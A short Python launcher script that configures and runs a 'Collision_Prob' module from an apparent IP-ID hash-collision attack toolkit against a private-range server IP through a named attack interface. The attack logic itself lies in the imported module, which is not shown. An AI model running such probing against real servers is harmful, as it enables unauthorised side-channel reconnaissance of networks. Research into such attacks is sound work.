# coding=utf-8

from IPID_HCSC.collision_prob import Collision_Prob


if __name__ == '__main__':
    server_ip = '172.21.0.12'

    attack_bind_if = 'eth0'
    own_ip_prefix = '10.10.0.0'

    collision = Collision_Prob(attack_target_server=server_ip, attack_target_network=own_ip_prefix,
                               bind_iface_name=attack_bind_if, verbose=True)
    collision.run()
    collision.wait_for_res()

